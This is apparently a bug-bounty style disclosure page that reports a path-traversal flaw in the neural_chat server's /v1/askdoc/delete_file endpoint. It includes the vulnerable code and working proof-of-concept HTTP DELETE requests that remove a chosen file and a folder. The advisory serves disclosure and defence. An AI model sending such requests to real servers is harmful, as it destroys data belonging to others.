@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-27T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-27T10:31:06+08:00","datePublished":"2024-05-27T10:31:06+08:00","description":"Name","headline":"Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"},"url":"http://0.0.0.0:4000/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-05-27T10:31:06+08:00" itemprop="datePublished">May 27, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Arbitrary File Deletion via Path Traversal in intel-extension-for-transformers neural_chat</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>v1.4.2</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post route <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L598"><code class="language-plaintext highlighter-rouge">/v1/askdoc/delete_file</code></a> endpoint in intel-extension-for-transformers <a href="https://github.com/intel/intel-extension-for-transformers/tree/main/intel_extension_for_transformers/neural_chat#introduction">neural_chat</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">del_path</code> parameter which allows the deletion of arbitrary file. The <code class="language-plaintext highlighter-rouge">del_path</code> is directly append to a directory path <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">without sanitization</a> and then the file is deleted. An attacker can delete files behalf of current process.</p>
+
+<p>The vulnerable function <a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L296C11-L296C30"><code class="language-plaintext highlighter-rouge">retrieval_add_files</code></a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.delete("/v1/askdoc/delete_file")
+async def delete_single_file(request: Request):
+    """Delete file according to `del_path` and `knowledge_base_id`.
+
+    `del_path`:
+        - specific file path(e.g. /path/to/file.txt)
+        - folder path(e.g. /path/to/folder)
+        - "all_files": delete all files of this knowledge base
+    """
+    params = await request.json()
+    del_path = params['del_path']
+    ...
+    # partially delete files/folders from the kb
+    if delete_path.exists():
+        # delete file
+        if delete_path.is_file():
+            try:
+                delete_path.unlink()
+            except Exception as e:
+                logger.info(f"[askdoc - delete_file] fail to delete file {delete_path}: {e}")
+                raise HTTPException(
+                    status_code=500,
+                    detail=f'Failed to delete file {delete_path}. Exception: {e}'
+                )
+        # delete folder
+        else:
+            try:
+                shutil.rmtree(delete_path)
+            except Exception as e:
+                logger.info(f"[askdoc - delete_file] fail to delete folder {delete_path}: {e}")
+                raise HTTPException(
+                    status_code=500,
+                    detail=f'Failed to delete folder {delete_path}. Exception: {e}'
+                )
+        return {"status": True}
+    else:
+        raise HTTPException(status_code=404, detail="File/folder not found. Please check del_path.")
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>First, we create a test file at <code class="language-plaintext highlighter-rouge">/home/kali/test.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# touch /home/kali/test.txt
+kali@fc7d9ff6a411:/# ls /home/kali/test.txt
+-rw-r--r-- 1 kali kali 0 May 27 16:29 /home/kali/test.txt
+</code></pre></div></div>
+
+<p>Then we start a default neural_chat server following tutorial from <a href="https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation">https://github.com/intel/intel-extension-for-transformers/blob/main/intel_extension_for_transformers/neural_chat/README.md#installation</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install system requirements
+sudo apt-get update
+sudo apt-get install -y python3-pip
+sudo apt-get install -y libgl1-mesa-glx
+
+# clone the project
+git clone https://github.com/intel/intel-extension-for-transformers.git
+cd intel-extension-for-transformers/intel_extension_for_transformers/neural_chat/
+
+# Install python requirements
+pip install -r requirements_cpu.txt
+pip install fastapi==0.103.2
+pip install intel-extension-for-transformers
+</code></pre></div></div>
+
+<p>Start neural_chat server, the service is open at <code class="language-plaintext highlighter-rouge">0.0.0.0:8000</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># start neural_chat server, it will download model from internet for first time, be patient.
+neuralchat_server start --config_file ./server/config/neuralchat.yaml
+</code></pre></div></div>
+
+<p>Send follow post request to the server using burpsuite to delete single file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+content-type: application/json
+Cookie: 
+Connection: close
+Content-Length: 89
+
+{"del_path":"/home/kali/test.txt","knowledge_base_id":"123"}
+</code></pre></div></div>
+
+<p>The response indicates the file is deleted.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Length: 15
+Connection: keep-alive
+Content-Type: application/json
+Date: Mon, 27 May 2024 06:26:58 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: uvicorn
+
+{"status":true}
+</code></pre></div></div>
+
+<p>We can verify the the file is deleted using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# ls /home/kali/test.txt
+ls: cannot access '/home/kali/test.txt': No such file or directory
+</code></pre></div></div>
+
+<p>Delete a folder using following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DELETE http://10.15.0.5:8000/v1/askdoc/delete_file HTTP/1.1
+Host: 10.15.0.5:8000
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+content-type: application/json
+Cookie: 
+Connection: close
+Content-Length: 89
+
+{"del_path":"/home/kali/test-folder","knowledge_base_id":"123"}
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can delete any files and folders the service process could access.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L621</a></p>
+
+
+  </div><a class="u-url" href="/file-deletion/2024/05/27/arbitrary-file-delete-in-intel-extension-for-transformers.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
